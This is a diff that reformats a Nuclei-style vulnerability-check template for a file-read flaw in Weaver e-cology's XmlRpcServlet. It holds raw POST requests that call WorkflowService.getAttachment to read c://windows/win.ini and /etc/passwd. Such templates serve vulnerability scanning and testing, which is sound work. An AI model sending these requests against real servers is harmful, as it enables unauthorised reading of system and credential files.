@@ -1,49 +1,74 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - base64
+  - part: header
+    type: word
+    words:
+    - HTTP/1.1 200 OK
+  matchers-condition: and
+  raw:
+  - 'POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 216
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <methodCall>
+
+    <methodName>WorkflowService.getAttachment</methodName>
+
+    <params>
+
+    <param>
+
+    <value><string>c://windows/win.ini</string></value>
+
+    </param>
+
+    </params>
+
+    </methodCall>
+
+    '
+  - 'POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 208
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <methodCall>
+
+    <methodName>WorkflowService.getAttachment</methodName>
+
+    <params>
+
+    <param>
+
+    <value><string>/etc/passwd</string></value>
+
+    </param>
+
+    </params>
+
+    </methodCall>
+
+    '
 id: xmlrpcservlet_lfi
 info:
-  name: 泛微e-cology XmlRpcServlet文件读取漏洞复现
   author: weehhd
-  severity: medium
   description: https://mp.weixin.qq.com/s?__biz=Mzk0MTUxNzAxMg==&mid=2247483905&idx=1&sn=d9b17d4657689f21dd48324612299f91
+  name: "\u6CDB\u5FAEe-cology XmlRpcServlet\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u590D\
+    \u73B0"
   reference:
-    - https://
+  - https://
+  severity: medium
   tags: tags
-http:
-  - raw:
-      - |+
-        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
-        Host: {{Hostname}}
-        Content-Length: 216
-        
-        <?xml version="1.0" encoding="UTF-8"?>
-        <methodCall>
-        <methodName>WorkflowService.getAttachment</methodName>
-        <params>
-        <param>
-        <value><string>c://windows/win.ini</string></value>
-        </param>
-        </params>
-        </methodCall>
-      - |+
-        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
-        Host: {{Hostname}}
-        Content-Length: 208
-
-        <?xml version="1.0" encoding="UTF-8"?>
-        <methodCall>
-        <methodName>WorkflowService.getAttachment</methodName>
-        <params>
-        <param>
-        <value><string>/etc/passwd</string></value>
-        </param>
-        </params>
-        </methodCall>
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - base64
-      - type: word
-        part: header
-        words:
-          - HTTP/1.1 200 OK
